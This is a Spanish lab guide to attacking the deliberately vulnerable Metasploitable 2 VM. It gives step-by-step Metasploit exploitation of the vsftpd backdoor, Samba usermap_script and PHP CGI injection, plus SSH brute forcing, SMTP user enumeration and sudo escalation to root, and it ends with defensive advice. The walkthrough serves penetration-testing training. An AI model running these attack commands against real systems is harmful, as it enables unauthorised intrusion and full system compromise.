# Metasploitable 2 en VMware – Guía práctica de instalación, enumeración y explotación

## Introducción

En esta práctica se trabaja con **Metasploitable 2**, una máquina virtual deliberadamente vulnerable diseñada para el aprendizaje de seguridad ofensiva y pruebas de penetración en entornos controlados.

El objetivo es desplegar la máquina en **VMware**, verificar la conectividad de red y realizar un proceso completo de **enumeración, explotación y post-explotación** utilizando herramientas habituales como **Nmap**, **Metasploit Framework**, **Netcat**, **ffuf** y utilidades específicas de servicios como **smbclient** y **smtp-user-enum**.

A lo largo del laboratorio se cubren los siguientes puntos:

- Descarga e importación de Metasploitable 2 en VMware.
- Identificación de la dirección IP y verificación de conectividad desde Kali Linux.
- Enumeración completa de puertos y servicios con Nmap.
- Identificación de configuraciones inseguras (FTP anónimo).
- Explotación de una vulnerabilidad conocida en **vsftpd 2.3.4**.
- Obtención de acceso remoto mediante shell / reverse shell.
- Ataque de fuerza bruta contra el servicio SSH usando diccionarios.
- Acceso al sistema mediante credenciales débiles.
- Escalada de privilegios mediante una mala configuración de `sudo`.
- Enumeración y acceso mediante **Telnet** (servicio obsoleto e inseguro).
- Interacción con **SMTP**: envío manual de correo y **enumeración de usuarios** (VRFY / smtp-user-enum).
- Enumeración del servicio **HTTP**: descubrimiento de rutas con **ffuf**, detección de fuga de información en `phpinfo` y explotación mediante **PHP CGI Argument Injection**.
- Enumeración y explotación de **SMB/Samba**: listado anónimo de recursos compartidos y ejecución remota de comandos en **Samba 3.0.20-Debian**.

> **Aviso**: Esta guía está pensada **exclusivamente para entornos de laboratorio y aprendizaje**. Metasploitable 2 es intencionadamente insegura y no debe exponerse nunca a redes reales o no controladas.

---

## 1. Descarga de Metasploitable 2

El primer paso es obtener Metasploitable 2 desde la página oficial de Rapid7:

https://www.rapid7.com/products/metasploit/metasploitable/

En esa página, se pulsa el botón **Download** para descargar la máquina virtual.

El archivo descargado es un **.zip**, que contiene los ficheros de la máquina virtual.

---

## 2. Extracción de los archivos

Una vez descargado el archivo ZIP:

1. Se descomprime en el equipo local.
2. Tras la extracción, se obtiene una carpeta que contiene varios archivos, entre ellos:
   - `Metasploitable.vmx` (archivo de configuración de la máquina virtual)
   - `Metasploitable.vmdk` (disco virtual)

Esta carpeta será la que se utilice para importar la máquina en VMware.

---

## 3. Importar Metasploitable en VMware

1. Abrir **VMware**.
2. En el menú superior, ir a: **Archivo > Abrir**
3. Navegar hasta la carpeta donde se extrajo Metasploitable.
4. Seleccionar el archivo `Metasploitable.vmx`.
5. Pulsar en **Abrir**.

VMware cargará la configuración de la máquina virtual y la máquina quedará lista para usarse.

---

## 4. Primer arranque y acceso al sistema

Durante el arranque, Metasploitable 2 muestra un aviso indicando que la máquina **no debe exponerse a redes no confiables**.

Tras finalizar el inicio, aparece la pantalla de login.

Credenciales por defecto:

- Usuario: `msfadmin`
- Contraseña: `msfadmin`

![Pantalla de login de Metasploitable](images/01-login-screen.png)

Introduciendo estas credenciales se accede correctamente al sistema.

![Sesión iniciada correctamente](images/02-successful-login.png)

Una vez dentro, se muestra un prompt bajo el usuario `msfadmin`, confirmando que la máquina funciona correctamente.

---

## 5. Comprobación de la dirección IP y conectividad

Una vez iniciada sesión en Metasploitable 2, el siguiente paso es identificar la **dirección IP** que le ha sido asignada a la máquina virtual, ya que será necesaria para trabajar con ella desde la máquina atacante (por ejemplo, Kali Linux).

### 5.1 Obtener la IP desde Metasploitable

Dentro de Metasploitable:

```bash
ifconfig
```

En la interfaz de red `eth0` se puede ver la dirección IP asignada.  
En este caso, la máquina Metasploitable ha recibido la siguiente IP:

```text
192.168.184.130
```

### 5.2 Comprobar conectividad desde Kali Linux

Desde la máquina Kali Linux, se comprueba si hay visibilidad de red hacia Metasploitable usando `ping`:

```bash
ping 192.168.184.130
```

La respuesta correcta confirma que:

- Ambas máquinas están en la misma red de laboratorio.
- Existe conectividad entre Kali y Metasploitable.
- El entorno está listo para comenzar las pruebas.

### 5.3 Descubrir la IP si no se conoce (netdiscover)

En caso de no conocer la IP de Metasploitable, se puede descubrir utilizando una herramienta de descubrimiento de hosts en red, como `netdiscover`.

Desde Kali Linux:

```bash
sudo netdiscover
```

Esta herramienta envía peticiones ARP en la red local y muestra los hosts activos. En la salida se puede identificar la máquina Metasploitable por:

- Su dirección IP
- Su dirección MAC
- El fabricante (por ejemplo, VMware, Inc.)

De esta forma, incluso sin acceso directo a la consola de Metasploitable, es posible localizar su dirección IP dentro del laboratorio.

---

## 6. Enumeración de servicios con Nmap

Una vez confirmada la conectividad con la máquina Metasploitable, el siguiente paso es realizar un **escaneo completo de puertos y servicios** para identificar qué servicios están expuestos y qué versiones se están ejecutando.

Para ello se utiliza el siguiente comando:

```bash
nmap -p- -sCV -n -Pn -vvv -T5 192.168.184.130 -oN fullscan
```

### 6.1 Explicación del comando

- `-p-`: Escanea todos los puertos TCP (1–65535).
- `-sC`: Ejecuta los scripts por defecto de Nmap (detección de configuraciones inseguras y vulnerabilidades comunes).
- `-sV`: Intenta detectar versiones de los servicios.
- `-n`: No realiza resolución DNS (más rápido).
- `-Pn`: No hace descubrimiento de host (asume que el host está activo).
- `-vvv`: Modo muy verboso (más detalle en la salida).
- `-T5`: Plantilla de tiempo agresiva (más rápido, para entornos controlados de laboratorio).
- `-oN fullscan`: Guarda el resultado en un archivo llamado `fullscan`.

Este tipo de comando es típico en entornos de laboratorio o pruebas controladas, ya que es un escaneo agresivo que busca obtener la máxima información posible del objetivo.

### 6.2 Revisión de resultados y organización

Una vez finalizado el escaneo, se revisa el contenido del archivo generado:

```bash
cat fullscan
```

Para mantener el trabajo organizado, se crea un directorio y se mueve el archivo de resultados:

```bash
mkdir metasploitable
mv fullscan metasploitable/
cd metasploitable
ls
```

De esta forma, los resultados del escaneo quedan almacenados y organizados para su posterior análisis.

### 6.3 Primer servicio identificado: FTP (puerto 21)

El primer puerto relevante que reporta Nmap es:

- Puerto: `21/tcp`
- Servicio: `FTP`
- Versión: `vsftpd 2.3.4`

Además, los scripts de Nmap indican lo siguiente:

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Esto significa que el servidor FTP permite acceso anónimo sin credenciales, lo cual es una configuración insegura.

### 6.4 Comprobación de acceso FTP anónimo

Para verificarlo, se intenta conexión desde Kali:

```bash
ftp Anonymous@192.168.184.130
```

Cuando el servidor solicita la contraseña, simplemente se pulsa **Enter** sin introducir ninguna.

Resultado:

```text
230 Login successful.
```

Esto confirma que:

- El servidor permite acceso FTP sin autenticación.
- Cualquier usuario puede listar, descargar (y en algunos casos subir) archivos.
- Si existieran ficheros sensibles, podrían ser accedidos sin ningún tipo de control.

---

## 7. Explotación del servicio FTP vulnerable (vsftpd 2.3.4)

Durante la fase de enumeración se identificó que el puerto **21/tcp** estaba abierto y que el servicio era **vsftpd 2.3.4**.  
Esta versión es conocida por contener una **puerta trasera (backdoor)** que permite ejecución de comandos remotos.

### 7.1 Búsqueda de exploits con searchsploit

```bash
searchsploit vsftpd 2.3.4
```

El resultado muestra exploits conocidos (incluyendo uno para Metasploit), lo que confirma que existe una vulnerabilidad explotable para este servicio.

### 7.2 Uso de Metasploit Framework

Se inicia Metasploit:

```bash
msfconsole
```

Se busca el módulo:

```text
search vsftpd 2.3.4
```

Se utiliza el exploit:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

### 7.3 Configuración del exploit

Se revisan las opciones necesarias:

```text
show options
```

Parámetros importantes:

- `RHOSTS`: IP de la víctima (Metasploitable)
- `RPORT`: Puerto del servicio FTP (21)
- `CHOST`: IP de la máquina atacante (Kali)
- `CPORT`: Puerto local para recibir la conexión

Primero se obtiene la IP de Kali con:

```bash
ifconfig
```

En este caso, la IP del atacante es:

```text
192.168.184.128
```

Se configuran las opciones:

```text
set CHOST 192.168.184.128
set CPORT 9090
set RHOSTS 192.168.184.130
```

### 7.4 Ejecución del exploit

Una vez configurado todo, se lanza el exploit con:

```text
run
```

Ejemplo de salida relevante:

```text
[+] 192.168.184.130:21 - Backdoor service has been spawned, handling...
[+] 192.168.184.130:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session opened
```

### 7.5 Impacto de la vulnerabilidad

Esta vulnerabilidad permite a un atacante ejecutar comandos remotamente y comprometer totalmente la máquina (RCE crítico).

---

## 8. Acceso a la máquina víctima tras la explotación

Tras ejecutar el exploit, Metasploit muestra un mensaje similar a:

```text
Command shell session 1 opened (192.168.184.128:9090 -> 192.168.184.130:6200)
```

Esto indica que la víctima ha iniciado una conexión de vuelta hacia el atacante y Metasploit nos proporciona una shell interactiva.

### 8.1 Verificación de que estamos dentro de la víctima

Para confirmarlo:

```bash
ifconfig
```

En la salida se observa la IP de la víctima:

```text
inet addr: 192.168.184.130
```

---

## 9. Ataque de fuerza bruta contra SSH usando Metasploit

Tras revisar `fullscan`, se identifica el servicio SSH:

```text
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1
```

### 9.1 Preparación de diccionarios

Archivo `users`:

```text
admin
admin123
msfadmin
```

Archivo `passwords`:

```text
pass
password
msfadmin
```

### 9.2 Selección del módulo de Metasploit

```bash
msfconsole
```

```text
search ssh_login
use auxiliary/scanner/ssh/ssh_login
```

### 9.3 Configuración del módulo

Opciones relevantes:

- `RHOSTS`
- `RPORT`
- `USER_FILE`
- `PASS_FILE`
- `STOP_ON_SUCCESS`

Ejemplo de configuración:

```text
set RHOSTS 192.168.184.130
set RPORT 22
set USER_FILE users
set PASS_FILE passwords
set STOP_ON_SUCCESS true
```

### 9.4 Ejecución del ataque

```text
run
```

Si una combinación es válida, el módulo lo indicará y puede abrir una sesión automáticamente.

---

## 10. Compromiso del servicio SSH mediante credenciales válidas

En este caso, se encuentra una credencial válida:

```text
Success: 'msfadmin:msfadmin'
SSH session 1 opened (192.168.184.128 -> 192.168.184.130:22)
```

### 10.1 Gestión de sesiones

Listar sesiones:

```text
sessions
```

Interactuar con la sesión 1:

```text
sessions 1
```

Verificación:

```bash
whoami
```

```text
msfadmin
```

---

## 11. Escalada de privilegios mediante sudo

Aunque el acceso por SSH corresponde al usuario `msfadmin`, se comprueba si tiene permisos especiales:

```bash
sudo -l
```

Salida:

```text
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

### 11.1 Obtención de shell como root

Dado que puede ejecutar cualquier comando con sudo:

```bash
sudo su
whoami
```

Salida:

```text
root
```

### 11.2 Impacto

- Cualquier atacante que comprometa `msfadmin` puede obtener acceso root inmediato.
- No existe separación de privilegios real.
- El sistema queda completamente comprometido.

En un entorno real, esto debería corregirse limitando estrictamente qué usuarios pueden usar `sudo` y qué comandos pueden ejecutar, aplicando el principio de mínimos privilegios.

---

## 12. Conclusiones (fase inicial)

Hasta este punto, el laboratorio ya ha demostrado un flujo completo y realista:

- Despliegue y preparación de un entorno vulnerable en VMware.
- Identificación de activos en red y verificación de conectividad.
- Enumeración exhaustiva de servicios y versiones mediante Nmap.
- Detección de configuraciones inseguras (FTP con acceso anónimo).
- Explotación de una vulnerabilidad crítica (vsftpd 2.3.4).
- Ataque a credenciales en SSH y acceso mediante credenciales débiles.
- Escalada a root por mala configuración de `sudo`.

A continuación, se continúa con la enumeración de servicios adicionales expuestos por la máquina, siguiendo el mismo enfoque: **identificar → verificar → explotar (si aplica) → documentar impacto**.

---

## 13. Telnet (23/tcp)

Tras volver a revisar `fullscan`, aparece el servicio Telnet:

```text
23/tcp open telnet syn-ack ttl 64 Linux telnetd
```

En este caso, no se observa que Nmap ejecute scripts específicos para este puerto (algo habitual: Telnet no suele beneficiarse tanto de NSE por defecto en comparación con otros servicios).

Telnet es un servicio **muy obsoleto**: permite conectarse a una máquina de forma remota (similar a SSH), pero **sin cifrado**. Por eso, en entornos modernos no se utiliza (y si se utiliza, es bajo túneles o controles adicionales).

### 13.1 Conexión al servicio Telnet

Para conectarnos basta con:

```bash
telnet 192.168.184.130
```

No se indica puerto porque Telnet usa el **23** por defecto.

📷 **Imagen — Login Telnet**  
![Telnet Login](images/image_telnet_login.png)

En este laboratorio, el servicio está tan mal configurado que se observan credenciales o indicios que facilitan el acceso.

📷 **Imagen — Sesión Telnet iniciada**  
![Telnet Session](images/image_telnet_session.png)

---

## 14. SMTP (25/tcp)

El siguiente servicio a revisar es SMTP:

```text
25/tcp open smtp Postfix smtpd
```

SMTP es el protocolo de correo. Aunque no siempre es explotable directamente, sí es muy útil para **enumeración**, validación de usuarios y pruebas de configuración (open relay, políticas de aceptación, etc.).

### 14.1 Conexión manual con Netcat

Para conectarnos al puerto SMTP de la víctima, se usa `nc` (Netcat):

```bash
nc 192.168.184.130 25
```

Netcat permite “hablar” con servicios TCP directamente. Es útil tanto para:
- Conexiones salientes hacia un puerto abierto (como aquí).
- Modo escucha (por ejemplo, esperando una reverse shell).

📷 **Imagen — Conexión SMTP con HELO**  
![SMTP HELO](images/image_smtp_helo.png)

Una vez conectados, el servidor presenta el banner y podemos iniciar conversación con `HELO`:

```text
HELO atacante
250 metasploitable.localdomain
```

### 14.2 Envío manual de un correo (diálogo SMTP)

También podemos simular el envío de un correo:

```text
MAIL FROM:<atacante@inventando.com>
250 2.1.0 Ok

RCPT TO:<msfadmin@metasploitable.localdomain>
250 2.1.5 Ok

DATA
354 End data with <CR><LF>.<CR><LF>

contenido del correo
.

250 2.0.0 Ok: queued as D7793CBB9
```

El mensaje queda en cola.

Para salir:

```text
QUIT
```

### 14.3 Enumeración de usuarios con VRFY

Dentro de SMTP, podemos utilizar `VRFY` para comprobar si ciertos usuarios existen en el sistema:

```text
VRFY root
252 2.0.0 root

VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table

VRFY msfadmin
252 2.0.0 msfadmin
```

Interpretación rápida:

- `252` → el servidor reconoce al usuario (existe).
- `550` → el usuario no existe (o no es válido localmente).

Esto es muy útil para enumerar usuarios válidos de cara a ataques posteriores (por ejemplo, password spraying en SSH, o ataques a aplicaciones web con login).

### 14.4 Enumeración automatizada con smtp-user-enum

Para automatizar el proceso (pasarle una lista y validar quién existe), usamos `smtp-user-enum`:

```bash
smtp-user-enum -M VRFY -U users -t 192.168.184.130
```

Explicación de parámetros:

- `-M VRFY` → Método usado para enumerar: VRFY.
- `-U users` → Archivo con la lista de usuarios a probar.
- `-t 192.168.184.130` → IP objetivo.

Ejemplo de salida:

```text
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 4
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Thu Feb 12 12:42:57 2026 #########
192.168.184.130: msfadmin exists
######## Scan completed at Thu Feb 12 12:43:02 2026 #########
1 results.

4 queries in 5 seconds (0.8 queries / sec)
```

---

## 15. HTTP (80/tcp)

El siguiente puerto clave es `80/tcp`. Si abrimos el navegador y visitamos:

```text
http://192.168.184.130:80
```

veremos una página de índice con accesos a aplicaciones web conocidas en Metasploitable 2.

📷 **Imagen — Página principal**  
![Web Home](images/image_web_home.png)

### 15.1 Enumeración de subrutas con ffuf

Para enumerar rutas y directorios disponibles en el servidor web, usamos `ffuf`:

```bash
ffuf -u http://192.168.184.130/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Explicación del comando:

- `-u http://.../FUZZ` → URL objetivo. `FUZZ` es el marcador que `ffuf` sustituirá por cada palabra de la lista.
- `-c` → salida con colores (mejor legibilidad).
- `-w <wordlist>` → diccionario de rutas (DirBuster medium list).

📷 **Imagen — Resultado ffuf**  
![FFUF Results](images/image_ffuf.png)

Ejemplos de resultados:

```text
test                    [Status: 301, Size: 322, Words: 21, Lines: 10, Duration: 2ms]
twiki                   [Status: 301, Size: 323, Words: 21, Lines: 10, Duration: 0ms]
tikiwiki                [Status: 301, Size: 326, Words: 21, Lines: 10, Duration: 8ms]
phpinfo                 [Status: 200, Size: 48074, Words: 2409, Lines: 657, Duration: 87ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 11, Duration: 19ms]
phpMyAdmin              [Status: 301, Size: 328, Words: 21, Lines: 10, Duration: 1ms]
```

Por ejemplo, la ruta `/test` muestra un índice de directorio:

📷 **Imagen — Directorio /test**  
![Test Directory](images/image_test.png)

### 15.2 `server-status` y `phpinfo`

- `server-status` devuelve **403 (Forbidden)**, lo que indica que el recurso existe pero está protegido.
- `phpinfo` devuelve **200** y expone información sensible.

`phpinfo` es una clara vulnerabilidad de **fuga de información**: muestra configuración de PHP, módulos, rutas internas, etc.

📷 **Imagen — phpinfo**  
![PHP Info](images/image_phpinfo.png)

Un detalle importante es el campo **Server API**, donde aparece **FastCGI**, que indica cómo se está ejecutando PHP en el servidor web.

### 15.3 Explotación con Metasploit: PHP CGI Argument Injection

Si el entorno es vulnerable, puede explotarse mediante inyección de argumentos al intérprete CGI de PHP (*PHP CGI Argument Injection*).

En Metasploit:

```bash
msfconsole
search PHP CGI
```

De los módulos encontrados, utilizamos el genérico:

```text
exploit/multi/http/php_cgi_arg_injection
```

Uso típico:

```text
use exploit/multi/http/php_cgi_arg_injection
show options
set RHOSTS 192.168.184.130
run
```

Una vez dentro, se puede abrir una shell:

📷 **Imagen — Meterpreter / shell**  
![Meterpreter](images/image_meterpreter.png)

```text
shell
whoami
www-data
```

**¿Por qué `www-data`?**  
Porque la ejecución se realiza a través del servidor web. En Linux, Apache suele correr como `www-data`, un usuario de servicio (no un usuario humano).

Enumeración básica del directorio web:

```text
pwd
/var/www

ls
dav
dvwa
index.php
mutillidae
phpMyAdmin
phpinfo.php
test
tikiwiki
tikiwiki-old
twiki
```

#### Nota: Meterpreter vs shell nativa

- Meterpreter no siempre se comporta como una shell “real”.
- Genera más “ruido” (más detectable) que una shell tradicional.
- En entornos reales podría ser bloqueado por AV/EDR.
- Por eso, a menudo se migra a una shell interactiva estándar.

---

## 16. SMB / Samba (139/tcp y 445/tcp)

En `fullscan` aparecen los puertos:

```text
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

Samba (SMB) es un protocolo de compartición de recursos en red (archivos/impresoras). Es muy común en entornos Windows/Active Directory, pero también se usa en Linux.

### 16.1 Enumeración de recursos con smbclient

En Linux podemos actuar como cliente SMB con `smbclient` para enumerar recursos compartidos:

```bash
smbclient -L //192.168.184.130/ -N
```

Explicación de opciones:

- `-L` → lista recursos compartidos (shares) del servidor.
- `//192.168.184.130/` → host objetivo en formato SMB.
- `-N` → no pedir contraseña (intento de login anónimo).

Salida (ejemplo):

```text
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
```

Esto confirma una configuración débil: **enumeración anónima** de shares.

### 16.2 Búsqueda de vulnerabilidades por versión (Samba 3.0.20)

Como Nmap nos dio versión concreta (**Samba 3.0.20-Debian**), podemos buscar exploits directamente:

```bash
msfconsole
search samba 3.0.20
```

Resultado relevante:

```text
exploit/multi/samba/usermap_script  (Samba "username map script" Command Execution)
```

Este exploit permite ejecución remota de comandos (RCE).

### 16.3 Explotación: usermap_script

Repetimos el flujo habitual:

```text
use exploit/multi/samba/usermap_script
show options
set RHOSTS 192.168.184.130
run
```

Al ejecutarlo, se abre una sesión de shell. Verificación:

```text
whoami
root
```

Esto implica compromiso total del sistema a través de SMB/Samba.

> Este punto refuerza la idea clave: **detectar versiones** (`-sV` en Nmap) acelera muchísimo el proceso de explotación, porque permite encontrar módulos específicos con alta fiabilidad.

---

## 17. Conclusiones finales

Este laboratorio demuestra cómo una combinación de **servicios vulnerables**, **credenciales débiles** y **malas configuraciones** puede llevar al **compromiso total** de un sistema.

A lo largo de la práctica se han trabajado y documentado:

- Preparación del entorno (VMware + red de laboratorio).
- Enumeración agresiva y organizada con Nmap.
- Configuración insegura: FTP con acceso anónimo.
- Vulnerabilidad crítica: vsftpd 2.3.4 backdoor (RCE).
- Ataque a credenciales: fuerza bruta en SSH con diccionarios.
- Acceso con credenciales por defecto y escalada a root por `sudo` mal configurado.
- Servicio obsoleto: Telnet sin cifrado.
- Interacción con SMTP: envío manual + enumeración de usuarios (VRFY / smtp-user-enum).
- Enumeración web con ffuf + detección de fuga de información en `phpinfo`.
- Explotación web: PHP CGI Argument Injection con acceso como `www-data`.
- Enumeración SMB anónima + explotación RCE en Samba 3.0.20.

Desde el punto de vista defensivo, la práctica refuerza:

- Mantener servicios y sistemas actualizados.
- Deshabilitar servicios obsoletos (Telnet) y accesos anónimos (FTP/SMB).
- No exponer endpoints de diagnóstico (`phpinfo`, `server-status`) en producción.
- Aplicar contraseñas robustas y políticas de autenticación.
- Restringir privilegios de `sudo` (mínimo privilegio).
- Monitorizar y auditar los servicios expuestos a red.

---
